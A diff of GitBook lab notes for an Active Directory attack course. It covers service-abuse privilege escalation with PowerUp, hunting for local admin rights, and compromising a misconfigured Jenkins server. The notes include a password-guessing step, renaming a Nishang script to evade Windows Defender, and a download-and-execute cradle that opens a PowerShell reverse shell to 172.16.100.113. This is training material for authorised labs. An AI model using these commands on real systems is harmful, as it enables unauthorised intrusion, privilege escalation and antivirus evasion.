@@ -1,15 +1,14 @@
 # Learning Objetive 5
 
-<figure><img src="../../../.gitbook/assets/image (14) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (21) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (148).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
 * Student VM : Service abused on the student VM for local privilege escalation
 
 Local Privilege Escalation - PowerUp
-
 
 We can use Powerup from PowerSploit module to check for any privilege escalation path. Feel free to use other tools mentioned in the class like WinPEAS.
 
@@ -26,14 +25,14 @@ C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 
 [*] Checking for unquoted service paths...
 
-<a data-footnote-ref href="#user-content-fn-1">ServiceName : AbyssWebServer</a>
+ServiceName : AbyssWebServer
 Path : C:\WebServer\Abyss Web Server\abyssws.exe -service
 ModifiablePath : @{ModifiablePath=C:\WebServer;
 IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
-<a data-footnote-ref href="#user-content-fn-1">StartName : LocalSystem</a>
-<a data-footnote-ref href="#user-content-fn-1">AbuseFunction : Write-ServiceBinary -Name 'AbyssWebServer' -Path</a>
+StartName : LocalSystem
+AbuseFunction : Write-ServiceBinary -Name 'AbyssWebServer' -Path
 
-<a data-footnote-ref href="#user-content-fn-1">CanRestart : True</a>
+CanRestart : True
 ServiceName : AbyssWebServer
 Path : C:\WebServer\Abyss Web Server\abyssws.exe -service
 ModifiablePath : @{ModifiablePath=C:\WebServer;
@@ -46,30 +45,30 @@ CanRestart : True
 
 [*] Checking service executable and argument permissions...
 
-<a data-footnote-ref href="#user-content-fn-1">ServiceName : AbyssWebServer</a>
-<a data-footnote-ref href="#user-content-fn-1">Path : C:\WebServer\Abyss Web Server\abyssws.exe -service</a>
+ServiceName : AbyssWebServer
+Path : C:\WebServer\Abyss Web Server\abyssws.exe -service
 ModifiableFile : C:\WebServer\Abyss Web Server
 ModifiableFilePermissions : {WriteOwner, Delete, WriteAttributes,
 Synchronize...}
-<a data-footnote-ref href="#user-content-fn-1">ModifiableFileIdentityReference : Everyone</a>
-<strong><a data-footnote-ref href="#user-content-fn-1">StartName : LocalSystem</a>
-</strong><a data-footnote-ref href="#user-content-fn-1">AbuseFunction : Install-ServiceBinary -Name</a>
-<a data-footnote-ref href="#user-content-fn-1">'AbyssWebServer'</a>
+ModifiableFileIdentityReference : Everyone
+<strong>StartName : LocalSystem
+</strong>AbuseFunction : Install-ServiceBinary -Name
+'AbyssWebServer'
 CanRestart : True
 [snip]
 
 [*] Checking service permissions...
 
-<a data-footnote-ref href="#user-content-fn-1">ServiceName : AbyssWebServer</a>
+ServiceName : AbyssWebServer
 Path : C:\WebServer\Abyss Web Server\abyssws.exe -service
-<a data-footnote-ref href="#user-content-fn-1">StartName : LocalSystem</a>
-<a data-footnote-ref href="#user-content-fn-1">AbuseFunction : Invoke-ServiceAbuse -Name 'AbyssWebServer'</a>
-<a data-footnote-ref href="#user-content-fn-1">CanRestart : True</a>
-<a data-footnote-ref href="#user-content-fn-1">ServiceName : SNMPTRAP</a>
+StartName : LocalSystem
+AbuseFunction : Invoke-ServiceAbuse -Name 'AbyssWebServer'
+CanRestart : True
+ServiceName : SNMPTRAP
 Path : C:\Windows\System32\snmptrap.exe
-<a data-footnote-ref href="#user-content-fn-1">StartName : LocalSystem</a>
-<a data-footnote-ref href="#user-content-fn-1">AbuseFunction : Invoke-ServiceAbuse -Name 'SNMPTRAP'</a>
-<a data-footnote-ref href="#user-content-fn-1">CanRestart : True</a>
+StartName : LocalSystem
+AbuseFunction : Invoke-ServiceAbuse -Name 'SNMPTRAP'
+CanRestart : True
 </code></pre>
 
 Let's use the abuse function for Invoke-ServiceAbuse and add our current domain user to the local Administrators group.
@@ -78,7 +77,7 @@ Let's use the abuse function for Invoke-ServiceAbuse and add our current domain 
 Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student113' -Verbose
 ```
 
-<figure><img src="../../../.gitbook/assets/image (22) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (149).png" alt=""><figcaption></figcaption></figure>
 
 We can see that the dcorp\studentx is a local administrator now. Just logoff and logon again and we have local administrator privileges!
 
@@ -105,26 +104,27 @@ C:\AD\Tools>C:\AD\Tools\Loader.exe -Path C:\AD\Tools\winPEASx64.exe -args  notco
 
 Spend some time analyzing the output of WinPEAS. For the lab, you will find useful information in the 'Services Information' section of the output:
 
-<pre><code>????????????????????????????????????? Services Information ?????????????????????????????????????
+```
+????????????????????????????????????? Services Information ?????????????????????????????????????
 
 ???????????? Interesting Services -non Microsoft-
 ? Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services
-<a data-footnote-ref href="#user-content-fn-1">    AbyssWebServer(Aprelium - Abyss Web Server)[C:\WebServer\Abyss Web Server\abyssws.exe -service] - Auto - Stopped - No quotes and Space detected</a>
-<a data-footnote-ref href="#user-content-fn-1">    YOU CAN MODIFY THIS SERVICE: AllAccess</a>
-<a data-footnote-ref href="#user-content-fn-1">    File Permissions: Everyone [AllAccess]</a>
-<a data-footnote-ref href="#user-content-fn-1">    Possible DLL Hijacking in binary folder: C:\WebServer\Abyss Web Server (Everyone [AllAccess], Users [AppendData/CreateDirectories WriteData/CreateFiles])</a>
+    AbyssWebServer(Aprelium - Abyss Web Server)[C:\WebServer\Abyss Web Server\abyssws.exe -service] - Auto - Stopped - No quotes and Space detected
+    YOU CAN MODIFY THIS SERVICE: AllAccess
+    File Permissions: Everyone [AllAccess]
+    Possible DLL Hijacking in binary folder: C:\WebServer\Abyss Web Server (Everyone [AllAccess], Users [AppendData/CreateDirectories WriteData/CreateFiles])
 
 [snip] 
 
 ???????????? Modifiable Services
 ? Check if you can modify any service https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services
     LOOKS LIKE YOU CAN MODIFY OR START/STOP SOME SERVICE/s:
- <a data-footnote-ref href="#user-content-fn-1">   AbyssWebServer: AllAccess</a>
+    AbyssWebServer: AllAccess
     RmSvc: GenericExecute (Start/Stop)
-<a data-footnote-ref href="#user-content-fn-1">    SNMPTRAP: AllAccess</a>
+    SNMPTRAP: AllAccess
         [snip]
 
-</code></pre>
+```
 
 ***
 
@@ -140,13 +140,13 @@ Similarly, we can use PrivEscCheck (https://github.com/itm4n/PrivescCheck) for a
 Invoke-PrivescCheck
 ```
 
-<figure><img src="../../../.gitbook/assets/image (23) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (150).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
 ### Hunt for Local Admin access
 
-* Student VM :  Script used for hunting for admin privileges using PowerShell Remoting
+* Student VM : Script used for hunting for admin privileges using PowerShell Remoting
 
 Now for the next task, to identify a machine in the domain where studentx has local administrative access, use Find-PSRemotingLocalAdminAccess.ps1:
 
@@ -159,7 +159,7 @@ C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 Find-PSRemotingLocalAdminAccess
 ```
 
-<figure><img src="../../../.gitbook/assets/image (24) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (151).png" alt=""><figcaption></figcaption></figure>
 
 So... studentx has administrative access on dcorp-adminsrv and on the student machine. We can connect to dcorp-adminsrv using winrs as the student user:
 
@@ -167,18 +167,18 @@ So... studentx has administrative access on dcorp-adminsrv and on the student ma
 winrs -r:dcorp-adminsrv cmd
 ```
 
-<figure><img src="../../../.gitbook/assets/image (25) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (152).png" alt=""><figcaption></figcaption></figure>
 
 ```
 set username
 set computername
 ```
 
-<figure><img src="../../../.gitbook/assets/image (27) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>
 
 #### We can also use PowerShell Remoting:
 
-> Note: Remenber use a new invishell>
+> Note: Remenber use a new invishell
 
 ```
 Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
@@ -186,7 +186,7 @@ Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
 $env:username
 ```
 
-<figure><img src="../../../.gitbook/assets/image (28) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (155).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
@@ -194,19 +194,19 @@ $env:username
 
 ## Abuse Jenkins Instance
 
-Next, let's try our hands on the Jenkins instance. To be able to execute commands on Jenkins server without admin access we must have privileges to Configure builds. We have a misconfigured Jenkins instance on dcorp-ci (http://172.16.3.11:8080). If we go to the "People" page of Jenkins we can see the users present on the Jenkins instance.&#x20;
+Next, let's try our hands on the Jenkins instance. To be able to execute commands on Jenkins server without admin access we must have privileges to Configure builds. We have a misconfigured Jenkins instance on dcorp-ci (http://172.16.3.11:8080). If we go to the "People" page of Jenkins we can see the users present on the Jenkins instance.
 
 > Note: Remember to use Edge to open the Jenkins web console!
 
-<figure><img src="../../../.gitbook/assets/image (29) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (156).png" alt=""><figcaption></figcaption></figure>
 
 Since Jenkins does not have a password policy many users use username as passwords even on the publicly available instances. By manually trying the usernames as passwords we can identify that the user builduser has password builduser. The user builduser can Configure builds and Add Build Steps which will help us in executing commands.
 
-<figure><img src="../../../.gitbook/assets/image (30) (1).png" alt="" width="563"><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (157).png" alt="" width="563"><figcaption></figcaption></figure>
 
-`builduser : builduser`&#x20;
+`builduser : builduser`
 
-Use the encodedcomand parameter of PowerShell to use an encoded reverse shell or use download execute cradle in Jenkins build step. You can use any reverse shell, below we are using a slightly modified version of Invoke-PowerShellTcp from Nishang.&#x20;
+Use the encodedcomand parameter of PowerShell to use an encoded reverse shell or use download execute cradle in Jenkins build step. You can use any reverse shell, below we are using a slightly modified version of Invoke-PowerShellTcp from Nishang.
 
 We renamed the function Invoke-PowerShellTcp to Power in the script to bypass Windows Defender.
 
@@ -216,13 +216,13 @@ If using Invoke-PowerShellTcp, make sure to include the function call in the scr
 powershell.exe iex (iwr http://172.16.100.113/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.113 -Port 443
 ```
 
-<figure><img src="../../../.gitbook/assets/image (31) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (158).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (32) (1).png" alt="" width="440"><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (159).png" alt="" width="440"><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (33) (1).png" alt="" width="551"><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (160).png" alt="" width="551"><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (165).png" alt=""><figcaption></figcaption></figure>
 
 ```
 powershell.exe iex (iwr http://172.16.100.113/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.113 -Port 443
@@ -239,11 +239,11 @@ powershell.exe iex (iwr http://172.16.100.113/Invoke-PowerShellTcp.ps1 -UseBasic
 
 Fristly, execute HFS to enable the share -->
 
-<figure><img src="../../../.gitbook/assets/image (35) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (162).png" alt=""><figcaption></figcaption></figure>
 
 After, upload the Invoke-PowerShellTcp.ps1 -->
 
-<figure><img src="../../../.gitbook/assets/image (36) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (163).png" alt=""><figcaption></figcaption></figure>
 
 > Note: There is the route to copy and paste in the command:
 >
@@ -251,15 +251,15 @@ After, upload the Invoke-PowerShellTcp.ps1 -->
 
 Once we have the payload and share run, <mark style="background-color:yellow;">remember to host turn off the Windows Firewall</mark>
 
-<figure><img src="../../../.gitbook/assets/image (38) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (164).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
 Once all it's done, check the visibility with the share, run the build and see the log -->
 
-<figure><img src="../../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (166).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (167).png" alt=""><figcaption></figcaption></figure>
 
 > Note: If you have issues, reboot the machine
 
@@ -269,7 +269,7 @@ Nice! One we have visibility, weak up the netcat and execute it again-->
 C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
 ```
 
-<figure><img src="../../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (168).png" alt=""><figcaption></figcaption></figure>
 
 We can now run commands on the reverse shell:
 
@@ -285,6 +285,4 @@ ipconfig
 $env:computername
 ```
 
-<figure><img src="../../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>
-
-[^1]: 
+<figure><img src="../../../.gitbook/assets/image (169).png" alt=""><figcaption></figcaption></figure>
